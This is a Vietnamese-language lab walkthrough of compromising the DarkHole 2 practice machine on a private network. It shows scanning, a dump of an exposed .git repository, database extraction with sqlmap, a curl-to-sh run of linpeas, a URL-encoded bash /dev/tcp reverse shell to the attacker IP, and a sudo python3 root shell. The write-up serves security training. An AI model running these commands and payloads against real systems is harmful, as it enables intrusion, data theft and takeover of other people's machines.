# LAB 8
## Chuẩn bị
* Máy kali có ip 172.16.203.129
![image](https://user-images.githubusercontent.com/91528234/222954758-a550f88e-2eb5-41e7-b640-ff78bd3a8937.png)

* Máy nạn nhân chưa rõ ip
![image](https://user-images.githubusercontent.com/91528234/222948225-4077e6ea-938e-4bf5-bc56-4a579d92470a.png)
## Quét mạng
* Quét mạng bằng công cụ `netdiscover`

![image](https://user-images.githubusercontent.com/91528234/222954800-fadad886-be42-4c21-8988-50b0a8a12831.png)
* Chúng ta quét được ip máy nạn nhân có ip `172.16.203.128`
* Chúng tôi hiện đang bắt đầu Nmap để thúc đẩy quá trình này. Chúng tôi đã thực hiện (-A) để liệt kê cổng mở và phát hiện ra thông tin cổng sau
```A
nmap -A 172.16.203.128
```
* Theo đầu ra Nmap, chúng tôi có

  * một máy chủ SSH chạy trên cổng 22

  * một dịch vụ HTTP đang chạy (Máy chủ Apache) trên cổng 80, cũng như một trang http-git
![image](https://user-images.githubusercontent.com/91528234/222954858-e94cab2d-72f5-463e-97ea-f54b95f6f02a.png)

## Liệt kê
* Trước tiên, chúng tôi sẽ cố gắng sử dụng HTTP. Hãy kiểm tra cổng 80 để xem có điều gì thú vị xuất hiện không. Vì Máy chủ Apache đang lắng nghe trên cổng 80 nên chúng tôi có thể xác minh ngay lập tức trên trình duyệt.
![image](https://user-images.githubusercontent.com/91528234/222954871-4087aaa2-d0a9-41d4-b4b7-8ba9c95ec503.png)

* Ngoại trừ trang đăng nhập, trang này không chứa thông tin hữu ích nào. Vì vậy, chúng tôi quyết định xem trước trang đăng nhập.
![image](https://user-images.githubusercontent.com/91528234/222954926-314e73a7-e3ff-4ade-8e6b-086d5f5dc7bb.png)
* Sau đó, chúng tôi quyết định xem trang http-git mà chúng tôi đã phát hiện ra trước đây trong quá trình quét tích cực Nmap.

* Chúng tôi đã giới thiệu một công cụ gọi là gitdumper để cải thiện tính thẩm mỹ của trang http-git này. Nó là một công cụ để có được một kho lưu trữ git từ một trang web để hiểu rõ hơn về tập dữ liệu.
![image](https://user-images.githubusercontent.com/91528234/222954933-0da5ee9e-d724-4d04-9285-9c0a78d6df67.png)

* Chúng tôi chỉ cần sử dụng chức năng git clone để cài đặt cái này.
```
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
```
* Sau khi tải xuống công cụ, chúng tôi cố gắng chạy nó bằng python.

* Một điều khác mà chúng tôi phải làm là cung cấp cho họ một tên thư mục để lưu các nhật ký git này (trong trường hợp của chúng tôi, chúng tôi đặt tên này là bản sao lưu cho trang http-git này).
``` 
mkdir backup
python3 git_dumper.py http://172.16.203.128/.git/ backup
```
![image](https://user-images.githubusercontent.com/91528234/222955194-cae37c69-44cf-465d-a73b-6b10e7b20190.png)
![image](https://user-images.githubusercontent.com/91528234/222955431-da09406a-a21c-481f-9553-aeb3a363c869.png)
* Sau đó, chúng tôi đã truy cập thư mục sao lưu và tệp nhật ký có ba mục. Sử dụng git, chúng tôi đã mở một trong các mục để tiến hành trong phòng thí nghiệm này.
```
cd backup
git log
git diff a4d900a8d85e8938d3601f3cef113ee293028e10
```
* Cuối cùng, chúng tôi đã phát hiện ra thông tin đăng nhập của trang đăng nhập được phát hiện trước đây trong quá trình lạm dụng http.
```
Email: lush@admin.com
Password: 321
```
![image](https://user-images.githubusercontent.com/91528234/222955596-e7d18dcd-f7bd-481d-b584-2714b00fbeae.png)
## Khai thác
* Chúng tôi được chuyển hướng đến một trang lạ sau khi đăng ký trên trang đó, trang mà chúng tôi nghĩ là phù hợp với các chiến thuật liên quan đến SQL injection.
![image](https://user-images.githubusercontent.com/91528234/222955723-22314a7c-bd39-4b56-89de-4ae84b06e5f7.png)

* Vì vậy, chúng tôi đã sử dụng bộ ợ để thu thập cookie của trang này. Nó sẽ thuận lợi cho chiến lược SQL injection của chúng ta.
![image](https://user-images.githubusercontent.com/91528234/222957849-f5a56eb5-ba8a-4cf5-a87c-d1ac097814c4.png)
* Những cookie này đã được lưu trong một tệp có tên “sql” bằng cách sử dụng lệnh `vim`. Chúng tôi đã bắt đầu một cuộc tấn công sqlmap bằng tệp này, yêu cầu cơ sở dữ liệu.
```
vim sql
sqlmap -r sql --dbs --batch
```
![image](https://user-images.githubusercontent.com/91528234/222957977-f674a42c-1609-47bd-8bfc-646b5146ddd6.png)


* Chúng tôi đã thu được một số cơ sở dữ liệu chỉ trong vài phút. Vì vậy, chúng tôi đã bắt đầu một lệnh khác (sử dụng tham số -D) để kết xuất cơ sở dữ liệu có tên darkhole_2.
```
sqlmap -r sql -D darkhole_2 --dump-all --batch
```
![image](https://user-images.githubusercontent.com/91528234/222959487-516c36cc-07f5-4fdf-83c4-9f651e7c48c4.png)
* Bây giờ, bằng cách sử dụng các thông tin đăng nhập ssh này, chúng tôi đã đăng nhập với người dùng Jehad và mở id của nó để xác thực nó.
```
ssh jehad@172.16.203.128 
```
![image](https://user-images.githubusercontent.com/91528234/222958038-ec9e77e2-0618-4c4a-a90f-8f8147bb1b52.png)

* Xem id của máy chủ
![image](https://user-images.githubusercontent.com/91528234/222958093-656da4bb-6f43-4942-a9d5-466a76848d4e.png)
## Nâng cấp đặc quyền

* Đã đến lúc bắt đầu quá trình leo thang đặc quyền. Chúng tôi đã chuyển sang thư mục tmp và thử chạy tập lệnh Linpeas với curl. Đây là tập lệnh tìm kiếm các đường dẫn tiềm năng để nâng cao đặc quyền trên các máy chủ Linux và đánh dấu chúng để hiểu rõ hơn về các trường hợp có khả năng khai thác đó.
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
* Sau khi chạy nó, chúng tôi thấy rằng một trang PHP dành cho người dùng Losy đã có sẵn trên cổng máy chủ cục bộ 9999. Do đó, chúng tôi đã nghĩ ra một kế hoạch sử dụng chuyển tiếp cổng cục bộ để truy cập trang đó.
![image](https://user-images.githubusercontent.com/91528234/222959993-a85aef5c-3eab-4fd2-ab2b-171e4919d614.png)
* Đầu tiên, chúng tôi đã đi đến thư mục đã đề cập trước đó và phát hiện ra tệp index.php. Điều này cho chúng tôi biết rằng chúng tôi có thể nhận được dấu nhắc lệnh (cmd) bằng cách sử dụng phương pháp chuyển tiếp cổng cục bộ đã thảo luận trước đó cho người dùng bị mất.
```
cd /opt/web
cat index.php
```
![image](https://user-images.githubusercontent.com/91528234/222960061-fb6af26e-f461-4a83-af1c-52239834f359.png)

* Bây giờ là lúc để khởi động cuộc tấn công này. Chúng tôi cố gắng đăng nhập với tư cách là người dùng jehad, sử dụng thông tin chi tiết về chuyển tiếp cổng cục bộ được cung cấp trong các kết quả trên mà chúng tôi đạt được.
```
ssh jehad@172.16.203.128 -L 9999:localhost:9999
```
![image](https://user-images.githubusercontent.com/91528234/222960191-d1f8f801-dce1-4a9f-8665-121f3502ce7e.png)
* Sau đó, chúng tôi thấy dấu nhắc lệnh của người dùng trong trình duyệt web. Chúng tôi xác thực điều này bằng cách thu thập id của người dùng này.
```
http://127.0.0.1:9999/?cmd=id
```
![image](https://user-images.githubusercontent.com/91528234/222960219-b598eb1b-c50a-4ee2-9b52-438193913a38.png)
* Bây giờ, chúng ta có thể nhận được một trình bao đảo ngược khi người dùng bị mất. Vì vậy, tôi đang nghe trên cổng 8888.
```
nc -nlvp 8888
```
* Tải trọng sau đây sẽ cung cấp cho tôi một lớp vỏ ngược
```
bash -c 'bash -i >& /dev/tcp/172.16.203.129/8888 0>&1'
```
* Sau đó dùng công cụ URL encode ta được đoạn code sau
```
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.16.203.129%2F8888%200%3E%261%27
```
* Sau đó gán vào đường mạng ( nhớ chú ý sau khi gán trang web phải trong chế độ load trang)
![image](https://user-images.githubusercontent.com/91528234/222965698-c344efee-42a7-4af2-8b71-ecbe6e874487.png)
* Đã cho tôi 1 lớp shell
![image](https://user-images.githubusercontent.com/91528234/222965728-8cec627d-45f8-4803-acfa-434be6a14280.png)

## Leo thang đặc quyền gốc
* Phần leo thang đặc quyền gốc dễ dàng nhất có thể. Trên tệp .bash_history, chúng tôi thấy mật khẩu được đặt cố ý.
```history```
![image](https://user-images.githubusercontent.com/91528234/222965905-cd9d8198-707d-4ce7-8408-54d24c93099f.png)

* Sử dụng command sau
```
sudo -lS
```
* và nhập pass `gang`
![image](https://user-images.githubusercontent.com/91528234/222966325-52dbc47d-ad38-4d00-880a-629447cf5d66.png)
* Chạy lệnh sau
```
sudo python3 -c 'import os; os.system("/bin/bash")'
```
![image](https://user-images.githubusercontent.com/91528234/222966392-6dcef360-2757-4bae-a34a-7eb6fa22d489.png)
* Vậy đã hoàn thành lab8



